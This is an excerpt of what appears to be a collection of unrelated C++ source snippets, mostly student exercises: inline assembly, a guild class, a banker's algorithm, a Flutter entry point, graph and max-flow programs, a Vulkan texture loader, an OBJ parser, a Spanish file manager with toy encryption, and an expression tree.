\u00ee\u00ef\u00e5\u00f0\u00e0\u00ed\u00e4.\r\n\t\t\u00d0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00e7\u00e1\u00e5\u00f0\u00b3\u00e3\u00e0\u00ba\u00f2\u00fc\u00f1\u00ff \u00e2 EAX(RAX), \u00e0 \u00ee\u00f1\u00f2\u00e0\u00f7\u00e0 \u00e2 EDX(RDX).*/\r\n\t\tcdq\r\n\t\tpop ebx\r\n\t\tmov secOperand, eax\r\n\t\tmov eax, [values + ebx]\r\n\t\tdiv secOperand\r\n\t\tmov[values + ebx], edx\r\n\t\tadd ebx, 4\t\t\t\t// \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start1\t\t\t\t// \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\tend_:\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\nint main() \r\n{\r\n\tTask1();\r\n\tOption15();\r\n\treturn 0;\r\n}\r\n",
    "#include<string>\r\n#include<memory>\r\n#include<vector>\r\n#include<iostream>\r\n#include<stdexcept>\r\n#include<set>\r\n#include<algorithm>\r\n#include<map>\r\n#include \"guild.h\"\r\n#include \"license.h\"\r\n#include \"person.h\"\r\n\r\n\tGuild::Guild(std::string name, unsigned fee, unsigned sal, const std::vector<std::shared_ptr<Person>>& members ):\r\n\t\tname{ name }, fee{ fee }, salary{ sal }, members{} {\r\n\t\tif (name.empty() || fee <= 0 || salary <= 0) {\r\n\t\t\tthrow std::runtime_error(\"Invalid name/fee/salary. \");\r\n\t\t}\r\n\t\r\n\t\tfor (const auto& i : members) {\r\n\t\t\tif (!add_member(i)) {\r\n\t\t\t\tthrow std::runtime_error(\"Worker allready in vector.\");\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tbool Guild::add_member(std::shared_ptr<Person> p) {\r\n\t\tif (members.count(p->get_name()) == 1) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tthis->members[p->get_name()] = p;\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\r\n\t}\r\n\r\n\tbool Guild::remove_member(std::string n) {\r\n\t\tif (members.count(n) == 0) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tmembers.erase(n);\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\r\n\tvoid Guild::grant_license(std::string n) {\r\n\t\tif (members.count(n) == 1 && members[n]->pay_fee(this->fee)) {\r\n\t\t\tmembers[n]->receive_license(std::make_unique<License>(this->name, this->salary));\r\n\t\t}\r\n\t\telse {\r\n\t\t\tthrow std::runtime_error(\"Not part of guild/not enough money to pay fee.\");\r\n\t\t}\r\n\t\r\n\t}\r\n\r\n\tbool Guild::offer_job(std::shared_ptr<Person> p) {\r\n\t\tif (members.count(p->get_name()) == 1 ) {\r\n\t\t\tp->work(salary * 2);\r\n\t\t\treturn true;\r\n\t\t}\r\n    \r\n\t\tif(p->eligible(name)) {\r\n\t\t\tp->work(this->name);\r\n\t\t\treturn true;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t\r\n\t}\r\n\r\n\tstd::ostream& Guild::print(std::ostream& o) const {\r\n\t\to<< \"[\" << this->name << \", License fee: \" << this->fee << \", Job salary: \" << this->salary << \", {\";\r\n\r\n\t\tbool first{ true };\r\n\t\tfor (const auto& i : this->members) {\r\n\t\t\tif (first) {\r\n\t\t\t\tfirst = false;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\to<< \", \";\r\n\t\t\t}\r\n\t\t\to << i.second->get_name();\r\n\t\t}\r\n\t\to << \"}]\";\r\n\t\treturn o;\r\n\t}\r\n\r\n\tstd::ostream& operator<<(std::ostream& o, const Guild& g) {\r\n\t\treturn g.print(o);\r\n\t}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <map>\n#include <queue>\n#include <algorithm>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <semaphore.h>\n#include <chrono>\n#include <thread>\n\nusing namespace std;\n\nstruct ResourceType {\n    std::string name;\n    std::vector<std::string> instances;\n};\n\nstruct Process {\n    int pid;\n    int deadline;\n    int computationTime;\n    std::vector<std::string> instructions;\n};\n\nstd::vector<ResourceType> resources;\nstd::map<int, Process> processes;\nsem_t resourceMutex; // Semaphore for resource access\nstd::vector<int> Available; // Available resources\nstd::vector<std::vector<int>> Max; // Maximum demand\nstd::vector<std::vector<int>> Allocation; // Current allocation\nstd::vector<std::vector<int>> Need; // Remaining needs\n\nsem_t mutex; // Semaphore for synchronization\n\nvoid parseResources(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    while (getline(file, line)) {\n        std::istringstream iss(line);\n        ResourceType resource;\n        std::getline(iss, resource.name, ':');\n        resource.name = resource.name.substr(resource.name.find_first_not_of(\" R\"), resource.name.npos);\n        std::string instance;\n        while (getline(iss, instance, ',')) {\n            resource.instances.push_back(instance.substr(instance.find_first_not_of(\" \"), instance.npos));\n        }\n        resources.push_back(resource);\n    }\n}\n\nvoid parseProcesses(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    Process currentProcess;\n    int processId = 0;\n    while (getline(file, line)) {\n        if (line.find(\"process_\") != std::string::npos) {\n            if (currentProcess.pid != 0) {\n                processes[currentProcess.pid] = currentProcess;\n                currentProcess.instructions.clear();\n            }\n            currentProcess.pid = ++processId;\n        } else if (!line.empty()) {\n            currentProcess.instructions.push_back(line);\n        }\n    }\n    if (currentProcess.pid != 0) {\n        processes[currentProcess.pid] = currentProcess;\n    }\n}\n\nbool isSafe() {\n    std::vector<bool> Finish(Max.size(), false);\n    std::vector<int> Work = Available;\n\n    while (true) {\n        bool found = false;\n        for (int i = 0; i < Max.size(); ++i) {\n            if (!Finish[i]) {\n                bool possible = true;\n                for (int j = 0; j < Available.size(); ++j) {\n                    if (Need[i][j] > Work[j]) {\n                        possible = false;\n                        break;\n                    }\n                }\n                if (possible) {\n                    for (int k = 0; k < Available.size(); ++k)\n                        Work[k] += Allocation[i][k];\n                    Finish[i] = true;\n                    found = true;\n                }\n            }\n        }\n        if (!found) break; // No allocation was possible in this loop iteration\n    }\n\n    // If all processes can finish, the system is in a safe state\n    for (bool f : Finish) if (!f) return false;\n    return true;\n}\n\nbool requestResources(int processId, const std::vector<int>& request) {\n    sem_wait(&mutex); // Begin critical section\n\n    // Check if request can be satisfied\n    for (int i = 0; i < request.size(); ++i) {\n        if (request[i] > Need[processId][i] || request[i] > Available[i]) {\n            sem_post(&mutex); // End critical section\n            return false; // Request cannot be satisfied immediately\n        }\n    }\n\n    // Temporarily allocate requested resources\n    for (int i = 0; i < request.size(); ++i) {\n        Available[i] -= request[i];\n        Allocation[processId][i] += request[i];\n        Need[processId][i] -= request[i];\n    }\n\n    // Check for safe state\n    if (!isSafe()) {\n        // Rollback resources\n        for (int i = 0; i < request.size(); ++i) {\n            Available[i] += request[i];\n            Allocation[processId][i] -= request[i];\n            Need[processId][i] += request[i];\n        }\n        sem_post(&mutex); // End critical section\n        return false; // Request cannot be granted due to unsafe state\n    }\n\n    sem_post(&mutex); // End critical section\n    return true; // Request granted\n}\n\nvoid useResources(int processId, const std::vector<int>& use) {\n    std::cout << \"Using resources for Process \" << processId << \": \";\n    for (size_t i = 0; i < resources.size(); ++i) {\n        const auto& res = resources[i];\n        for (int j = 0; j < use[i]; ++j) {\n            std::cout << res.instances[j] << \" \";\n        }\n    }\n    std::cout << std::endl;\n}\n\nvoid releaseResources(int processId, const std::vector<int>& release) {\n    sem_wait(&mutex); // Begin critical section\n\n    // Release resources\n    for (int i = 0; i < release.size(); ++i) {\n        Available[i] += release[i];\n        Allocation[processId][i] -= release[i];\n        Need[processId][i] += release[i];\n    }\n\n    sem_post(&mutex); // End critic",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"projectt_one\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <sstream>\n#include <fstream>\n#include <algorithm>\n#include \"Graph.h\"\n\n \nbool comp(account& comp1, account& comp2){\n    return comp1.getName() < comp2.getName();\n}\n\n\n// this is the resource i used for transform https://stackoverflow.com/questions/313970/how-to-convert-an-instance-of-stdstring-to-lower-case\nstring makeLower(const string& letter) {\n    string result = letter;\n    transform(result.begin(), result.end(), result.begin(),\n                   [](unsigned char k) { return tolower(k); });\n    return result;\n}\n\n///////////////// Before submitting your code\n //uncomment this part since zyBooks use it.\n int main(int argc, const char* argv[]) {\n    if (argc != 2)\n     {\n         std::cout << \"./project4 inputFile\" << std::endl;\n         return EXIT_FAILURE;\n     }\n    string inputFileName = argv[1];\n    \n///////////////////// uncomment above befofre submitting on zyBooks /////////////////\n//2) Comment the next 2 lines below\n// int main(void) {\n//     string inputFileName = \"input1.txt\";    //Do NOT change the name \"inputFileName\" since used above\n\nvector<account> total;\n/// everything under this is from homework 8 \n\n    ifstream inputFile(inputFileName);\n    if (inputFile.fail()) {\n        cout << \"Failed to open file\" << endl;\n        return 1 ;\n    }\n    \n    string node, neinode;\n    while (inputFile >> node >> neinode) {\n        // call the make lower function to make everything lower case \n        node = makeLower(node);\n    neinode = makeLower(neinode);\n    // 2 bool statements that start at false and we make it true when neeeded\n        bool foundNode = false, foundNeinode = false;\n\n        // Check if the node and neinode already exist in the 'total' vector\n    for (auto it = total.begin(); it != total.end(); ++it) {\n    if (it->getName() == node) {\n        it->setFollower(neinode);\n        foundNode = true;\n    } else if (it->getName() == neinode) {\n        it->setFollowing(node);\n        foundNeinode = true;\n    }\n\n    // If both node and neinode found, stop searching\n    if (foundNode && foundNeinode)\n        break;\n\n           \n       }\n        // If node or neinode not found, create new account and add to 'total'\n    if (foundNode == false || foundNeinode == false) {\n    if (foundNode == false) {\n        account newNode(node);\n        newNode.setFollower(neinode);\n        total.push_back(newNode);\n    }\n    if (foundNeinode == false) {\n        account newNeinode(neinode);\n        newNeinode.setFollowing(node);\n        total.push_back(newNeinode);\n    }\n}\n}\n    inputFile.close();\n    // homework 8 code ends\n    //set all degrees\n    \nfor (unsigned int i = 0; i < total.size(); ++i) {\n    total[i].setdeg();\n}\n\n\n//sort the vectors for total of type account\n\nstable_sort(total.begin(),total.end());\n\n\n\n//gets the last of the vector\naccount high = total.back();\n\n\nvector<account>onedeg;\n// i made rfollow = to high.getfollower() because i kept getting errors when using high.getFollower().size() in the for loop\nvector<string>rfollow = high.getFollower();\n\n\n\n\nsort(rfollow.begin(), rfollow.end(), [](const string& a, const std::string& b) {\n    return a < b; \n});\n\n\n///nested for loops that add total to onedeg and finishes after it goes through all total.size()\n\nfor (unsigned int i = 0; i < total.size(); ++i) {\n    for (unsigned int j = 0; j < rfollow.size(); ++j) {\n        if (total[i].getName() == rfollow[j]) {\n            onedeg.push_back(total[i]);\n            break;\n        }\n    }\n}\n\n// sort in alphabetlical order for the degrees\n\nsort(onedeg.begin(), onedeg.end(), [](const account& a, const account& b) {\n    return a.getName() < b.getName();\n});\ncout << \"The root user is \" << high.getName() << \", with in-degree centrality of \" << high.getdeg() << \".\" << endl;\n\n\n  \n  cout << \"There are \" << total.size() << \" users in the social network\" << \".\" << endl;\n  \n  \n  \n  cout << high.getName() << \" (0)\" << endl;\n  \n  // for loop to print the degrees\n  \n  for (unsigned int  i = 0; i < onedeg.size(); ++i) {\n      \n      \n      \n    const account& onefollow = onedeg[i];\n    \n    \n     vector<string>simplefollower = onefollow.getFollower();\n\n//frist degree\n\n    cout << onefollow.getName() << \" (1)\" << endl;\n\n\n\n// sorting second degree\n    sort(simplefollower.begin(), simplefollower.end());\n\n    //second degree\n    \n    for (unsigned int j = 0; j < simplefollower.size(); ++j) {\n        cout << simplefollower.at(j) << \" (2)\" << endl;\n    }\n}\n\n   return 0;   \n}\n",
    "#include \"Texture.h\"\n#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.h\"\n#include <sstream>\n#include \"VkHelper.h\"\n\nbool Texture::load(AAssetManager *assetManager, VkDevice device, VkPhysicalDeviceMemoryProperties physicalMemoType, VkCommandPool cmdPool, VkQueue queue, const char *fileName) {\n    AAsset* file = AAssetManager_open(assetManager, fileName, AASSET_MODE_BUFFER);\n    if(!file){\n        std::stringstream ss;\n        ss << \"can not load the texture, fileName=\" << fileName;\n        throw std::runtime_error(ss.str());\n    }\n    auto fileData = std::vector<stbi_uc>(AAsset_getLength(file));\n    if(AAsset_read(file, fileData.data(), fileData.size()) != fileData.size())\n    {\n        AAsset_close(file);\n        throw std::runtime_error{\"Unknown error. Couldn't read from texture file.\"};\n    }\n    AAsset_close(file);\n\n    auto pixels = stbi_load_from_memory(fileData.data(), fileData.size(), &height, &width,\n                                          &channels, STBI_rgb_alpha);\n    if(nullptr == pixels){\n        std::stringstream ss;\n        ss << \"can not load the texture, fileName=\" << fileName;\n        throw std::runtime_error(ss.str());\n    }\n\n    VkDeviceSize size = width * height * 4;//rgba\n    VkBuffer stagingBuffer;\n    VkDeviceMemory stagingMemory;\n    VkHelper::createBufferInternal(physicalMemoType, device, VK_BUFFER_USAGE_TRANSFER_SRC_BIT,\n                                   VK_MEMORY_PROPERTY_HOST_VISIBLE_BIT | VK_MEMORY_PROPERTY_HOST_COHERENT_BIT,\n                                   size, &stagingBuffer, &stagingMemory);\n    void* data;\n    vkMapMemory(device, stagingMemory, 0, size, 0, &data);\n    memcpy(data, pixels, static_cast<size_t>(size));\n    vkUnmapMemory(device, stagingMemory);\n    stbi_image_free(pixels);\n\n    VkHelper::createImage(physicalMemoType, device, width, height, 1, VK_IMAGE_TYPE_2D, VK_FORMAT_R8G8B8A8_SRGB,\n                          VK_SAMPLE_COUNT_1_BIT, VK_IMAGE_TILING_LINEAR, VK_IMAGE_USAGE_TRANSFER_DST_BIT | VK_IMAGE_USAGE_SAMPLED_BIT,\n                          &mImage, &mMemory);\n\n    VkCommandBuffer cmdBuffer;\n    VkHelper::allocateCommandBuffers(device, cmdPool, 1, &cmdBuffer);\n    VkHelper::beginCommandBuffer(cmdBuffer, true);\n    VkBufferImageCopy region = {\n            .bufferOffset = 0,\n            .bufferRowLength = 0,\n            .bufferImageHeight = 0,\n            .imageSubresource = {\n                    .aspectMask = VK_IMAGE_ASPECT_COLOR_BIT,\n                    .mipLevel = 0,\n                    .baseArrayLayer = 0,\n                    .layerCount = 1\n            },\n            .imageOffset = {0, 0, 0},\n            .imageExtent = {static_cast<uint32_t>(width), static_cast<uint32_t>(height), 1}\n    };\n    vkCmdCopyBufferToImage(cmdBuffer, stagingBuffer, mImage, VK_IMAGE_LAYOUT_TRANSFER_DST_OPTIMAL, 1, &region);\n    VkHelper::endCommandBuffer(cmdBuffer, device, cmdPool, queue, true);\n\n    vkDestroyBuffer(device, stagingBuffer, VK_ALLOC);\n    vkFreeMemory(device, stagingMemory, VK_ALLOC);\n\n    //image view\n    VkHelper::createImageView(device, mImage, VK_IMAGE_VIEW_TYPE_2D, VK_FORMAT_R8G8B8A8_SRGB, VK_IMAGE_ASPECT_COLOR_BIT, &mImgView);\n    //sampler\n    VkHelper::createImageSampler(device, &mSampler);\n\n    return false;\n}\n\nvoid Texture::destroy(VkDevice device) {\n    vkDestroySampler(device, mSampler, VK_ALLOC);\n    vkDestroyImageView(device, mImgView, VK_ALLOC);\n    vkDestroyImage(device, mImage, VK_ALLOC);\n    vkFreeMemory(device, mMemory, VK_ALLOC);\n}\n",
    "#include \"obj_loader.hpp\"\n\n#include <fstream>\n#include <iostream>\n\n#include <vector>\n#include <string>\n#include <string.h>\n\n#include <bits/stdc++.h>\n\n// Some Code Modified, or Copied from\n// https://github.com/tinyobjloader/tinyobjloader/tree/release\nnamespace obj\n{\n    // http://stackoverflow.com/questions/6089231/getting-std-ifstream-to-handle-lf-cr-and-crlf\n    static std::istream &safeGetline(std::istream &is, std::string &t) {\n        t.clear();\n\n        // The characters in the stream are read one-by-one using a std::streambuf.\n        // That is faster than reading them one-by-one using the std::istream.\n        // Code that uses streambuf this way must be guarded by a sentry object.\n        // The sentry object performs various tasks,\n        // such as thread synchronization and updating the stream state.\n\n        std::istream::sentry se(is, true);\n        std::streambuf *sb = is.rdbuf();\n\n        if (se) {\n          for (;;) {\n            int c = sb->sbumpc();\n            switch (c) {\n              case '\\n':\n                return is;\n              case '\\r':\n                if (sb->sgetc() == '\\n') sb->sbumpc();\n                return is;\n              case EOF:\n                // Also handle the case when the last line has no line ending\n                if (t.empty()) is.setstate(std::ios::eofbit);\n                return is;\n              default:\n                t += static_cast<char>(c);\n            }\n          }\n        }\n\n        return is;\n    }\n\n    bool isSpace(char x)\n    {\n        return (((x) == ' ') || ((x) == '\\t'));\n    }\n\n    bool isEndLine(char x)\n    {\n        return (((x) == '\\r') || ((x) == '\\n') || ((x) == '\\0'));\n    }\n\n    std::string ObjLoader::Buffer::getNextString()\n    {\n        std::stringstream ss;\n\n        while(!isSpace(peek(0)) && !isEndLine(peek(0)))\n        {\n            ss << get();\n        }\n\n        return ss.str();\n    }\n\n    float ObjLoader::Buffer::getNextFloat()\n    {\n        auto string = getNextString();\n\n        try\n        {\n            return std::stof(string);\n        }\n        catch(const std::exception& e)\n        {\n            std::cout << \"Cannot parse: \" << lineBuf << '\\n';\n            std::cout << \"Cannot convert: \" << string << \" to float\" << '\\n';\n            throw e;\n        }\n    }\n\n    int ObjLoader::Buffer::getNextInt()\n    {\n        std::stringstream ss;\n\n        while(isdigit(peek(0)))\n        {\n            ss << get();\n        }\n\n        try\n        {\n            return std::stoi(ss.str());\n        }\n        catch(const std::exception& e)\n        {\n            std::cout << \"Cannot parse: \" << lineBuf << std::endl;\n            std::cout << \"Cannot convert: \" << ss.str() << \" to int\" << '\\n';\n            throw e;\n        }\n    }\n\n    void ObjLoader::Buffer::skipSpaces()\n    {\n        while(isSpace(peek(0)))\n        {\n            bufferIndex++;\n        }\n    }\n\n    char ObjLoader::Buffer::peek(int at)\n    {\n        return lineBuf[bufferIndex + at];\n    }\n    \n    char ObjLoader::Buffer::get()\n    {\n        bufferIndex++;\n        return lineBuf[bufferIndex - 1];\n    }\n     \n    index_t ObjLoader::parseIndex(Buffer& buffer)\n    {\n        index_t index{};\n        \n        index.vertex_index = static_cast<uint32_t>(buffer.getNextInt());\n        buffer.bufferIndex++;\n        index.normal_index = static_cast<uint32_t>(buffer.getNextInt());\n        buffer.bufferIndex++;\n        index.texcoord_index = static_cast<uint32_t>(buffer.getNextInt());\n\n        return index;\n    }\n        \n    bool ObjLoader::loadObj3(const std::string& filepath, shape_t* shape, attrib_t* attrib, std::string* err, bool KeepOneIndexing)\n    {\n        shape->name.clear();\n        attrib->vertices.clear();\n        attrib->normals.clear();\n        attrib->texcoords.clear();\n        shape->mesh.indeces.clear();\n\n        Buffer buffer{};\n\n        std::ifstream fs(filepath);\n        if (!fs.is_open())\n        {\n            if(err) *err = \"Failed to open \" + filepath;\n            return false;\n        }\n        \n        for (int lineNum = 0; fs.peek() != -1; lineNum++) \n        {\n            safeGetline(fs, buffer.lineBuf);\n\n            if (buffer.lineBuf.empty()) continue;\n\n            buffer.bufferIndex = 0;\n            buffer.bufferSize = buffer.lineBuf.size();\n\n            buffer.skipSpaces();\n\n            if(buffer.peek(0) == 'o' && isSpace(buffer.peek(1)))\n            {\n                buffer.bufferIndex += 2;\n                std::stringstream ss;\n                while(buffer.bufferIndex < buffer.bufferSize)\n                {\n                    if(!isEndLine(buffer.peek(0)))\n                    {\n                        ss << buffer.get();\n                    }\n                    else break;\n                }\n                shape->name = ss.str();\n                continue;\n            }\n\n            if(buffer.peek(0) == 'v' && isSpace(buffer.peek(1)))\n            {\n                buffer.bufferIndex += 2;\n\n                attrib->vertices.push_back(buffer.getNextFloat()",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nbool bfs(vector<vector<int>> &residual, int s, int t, int &n, vector<int> &par)\n{\n    vector<bool> vis(n + 1, false);\n    queue<int> q;\n    q.push(s);\n    vis[s] = true;\n    par[s] = -1;\n\n    while (!q.empty())\n    {\n        int u = q.front();\n        q.pop();\n\n        for (int v = 1; v <= n; v++)\n        {\n            if (vis[v] == false and residual[u][v] > 0)\n            {\n                if (v == t)\n                {\n                    par[v] = u;\n                    return true;\n                }\n                q.push(v);\n                par[v] = u;\n                vis[v] = true;\n            }\n        }\n    }\n\n    return false;\n}\n\nint main()\n{\n    int n;\n    cin >> n;\n    int src, dst;\n    cin >> src >> dst;\n    int m;\n    cin >> m;\n    vector<vector<int>> graph(n + 1, vector<int>(n + 1, 0));\n    for (int i = 0; i < m; i++)\n    {\n        int u, v, w;\n        cin >> u >> v >> w;\n        graph[u][v] = w;\n    }\n\n    vector<vector<int>> residual = graph;\n    vector<int> par(n + 1, 0);\n    int maxi = 0;\n\n    while (bfs(residual, src, dst, n, par))\n    {\n        int flow = INT_MAX;\n        for (int v = dst; v != src; v = par[v])\n        {\n            int u = par[v];\n            flow = min(flow, residual[u][v]);\n        }\n\n        for (int v = dst; v != src; v = par[v])\n        {\n            int u = par[v];\n            residual[u][v] -= flow;\n            residual[v][u] += flow;\n        }\n\n        maxi += flow;\n    }\n\n    cout << maxi;\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <filesystem> // Para manejar archivos y directorios\n#include <iomanip> // Para formatear la salida\n#include <stdio.h>\nusing namespace std;\nnamespace fs = std::filesystem;\n\n// Funci\u00f3n para encriptar contenido\nstring encriptar(const string& contenido, const string& clave) {\n    string contenidoEncriptado = contenido;\n    // Algoritmo simple de encriptaci\u00f3n\n    for (size_t i = 0; i < contenidoEncriptado.length(); ++i) {\n        contenidoEncriptado[i] += clave[i % clave.length()];\n    }\n    return contenidoEncriptado;\n}\n\n// Funci\u00f3n para desencriptar contenido\nstring desencriptar(const string& contenidoEncriptado, const string& clave) {\n    string contenidoDesencriptado = contenidoEncriptado;\n    // Algoritmo simple de desencriptaci\u00f3n\n    for (size_t i = 0; i < contenidoDesencriptado.length(); ++i) {\n        contenidoDesencriptado[i] -= clave[i % clave.length()];\n    }\n    return contenidoDesencriptado;\n}\n\nvoid crearArchivo() {\n    string directorio, nombreArchivo, contenido;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    cout << \"Ingrese el contenido del archivo:\" << endl;\n    getline(cin, contenido);\nrename(\"directorio+nombreArchivo\",\"nombreArchivo\");\n    ofstream archivo(rutaArchivo);\n    if (archivo.is_open()) {\n        string contenidoEncriptado = encriptar(contenido, \"clave\"); // Encriptar con clave\n        archivo << contenidoEncriptado << endl;\n        archivo.close();\n        cout << \"Archivo creado exitosamente.\" << endl;\n    } else {\n        cout << \"No se pudo abrir el archivo para escritura.\" << endl;\n    }\n}\n\nvoid leerArchivo() {\n    string directorio, nombreArchivo;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    ifstream archivoEntrada(rutaArchivo);\n    if (archivoEntrada.is_open()) {\n        string linea;\n        while (getline(archivoEntrada, linea)) {\n            string lineaDesencriptada = desencriptar(linea, \"clave\"); // Desencriptar con clave\n            cout << lineaDesencriptada << endl;\n        }\n        archivoEntrada.close();\n    } else {\n        cout << \"No se pudo abrir el archivo para lectura.\" << endl;\n    }\n}\n\nvoid escribirArchivo() {\n    string directorio, nombreArchivo, contenido;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    ofstream archivo(rutaArchivo, ios::app); // Abre el archivo en modo de a\u00f1adir al final\n    if (archivo.is_open()) {\n        cout << \"Ingrese el contenido que desea agregar al archivo:\" << endl;\n        getline(cin, contenido);\n        string contenidoEncriptado = encriptar(contenido, \"clave\"); // Encriptar con clave\n        archivo << contenidoEncriptado << endl;\n        archivo.close();\n        cout << \"Contenido agregado al archivo exitosamente.\" << endl;\n    } else {\n        cout << \"No se pudo abrir el archivo para escritura.\" << endl;\n    }\n}\n\nvoid listarArchivosCreados(const string& directorio) {\n    cout << \"Archivos creados en el directorio '\" << directorio << \"':\" << endl;\n    for (const auto& entry : fs::directory_iterator(directorio)) {\n        if (entry.is_regular_file()) {\n            cout << entry.path().filename() << endl;\n        }\n    }\n}\n\nvoid verContenidoArchivos(const vector<string>& archivos) {\n    for (const auto& archivo : archivos) {\n        cout << \"Contenido del archivo '\" << archivo << \"':\" << endl;\n        ifstream archivoEntrada(archivo);\n        if (archivoEntrada.is_open()) {\n            string linea;\n            while (getline(archivoEntrada, linea)) {\n                string lineaDesencriptada = desencriptar(linea, \"clave\"); // Desencriptar con clave\n                cout << lineaDesencriptada << endl;\n            }\n            archivoEntrada.close();\n        } else {\n            cout << \"No se pudo abrir el archivo para lectura.\" << endl;\n        }\n        cout << \"------------------------------------------\" << endl;\n    }\n}\nvoid mover() {\n    string directorio, nombreArchivo,directorio2;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    cout << \"Ingrese el nuevo directorio del archivo: \";\n    getline(cin, directorio2);\n\n    string rutaArchivo2 = directorio2 + '/' + nombreArchivo;\n\n    // Construye las rutas completas tanto para el antiguo como para el nuevo nombre de archivo\n    string ruta_antiguo = rutaArchivo;\n    s",
    "Practical No: 05\r\r\nTitle : A C++ Program to Create and Display an Expression Tree\r\r\n Input : Postfix Expression\r\r\n Output: Preorder, Inorder and Postorder Traversal of Expression Tree\r\r\n*/\r\r\n //.........Header Files\r\r\n#include <iostream>\r\r\nusing namespace std;\r\r\n //.........Input to Program\r\r\nchar postfix[10];\r\r\n //.........Node of Expression Tree\r\r\nstruct Node\r\r\n{\r\r\n char data;\r\r\n struct Node *left;\r\r\n struct Node *right;\r\r\n}*Root;\r\r\n //.......Stack to store Pointers of Nodes\r\r\nstruct Node* stack[5];\r\r\nint top = -1;\r\r\n //......To push Pointers in Stack\r\r\nvoid push_stk(struct Node *newnode) \r\r\n{\r\r\n top++;\r\r\n stack[top] = newnode;\r\r\n}\r\r\n //......To pop Pointers from Stack\r\r\nstruct Node* pop_stk()\r\r\n{\r\r\n struct Node *temp;\r\r\n \r\r\n temp = stack[top];\r\r\n top--;\r\r\n \r\r\n return temp;\r\r\n}\r\n//.........Function to Create New Node \r\r\nstruct Node* create_Node(char val)\r\r\n{\r\r\n struct Node *Newnode;\r\r\n \r\r\n Newnode = new struct Node;\r\r\n \r\r\n Newnode->data = val;\r\r\n Newnode->left = NULL;\r\r\n Newnode->right = NULL;\r\r\n \r\r\n return Newnode;\r\r\n}\r\r\n \r\r\n //.........Function to Create an Expression Tree\r\r\nvoid create_Exptree()\r\r\n{\r\r\n int i;\r\r\n \r\r\n struct Node *Newnode;\r\r\n \r\r\n cout<<\"\\n\\n Enter the Postfix Expression: \";\r\r\n cin>>postfix;\r\r\n \r\r\n for(i=0; postfix[i] != '\\0'; i++)\r\r\n { //.....If Operand\r\r\n if(postfix[i] == 'a' || postfix[i] == 'b' || postfix[i] == 'c' || postfix[i] == 'd')\r\r\n {\r\r\n //........Create New Node for Operand\r\r\n Newnode = create_Node(postfix[i]); \r\r\n //........Push Operand in Stack\r\r\n push_stk(Newnode);\r\r\n }\r\r\n//.....If Operator\r\r\n if(postfix[i] == '+' || postfix[i] == '-' || postfix[i] == '*' || 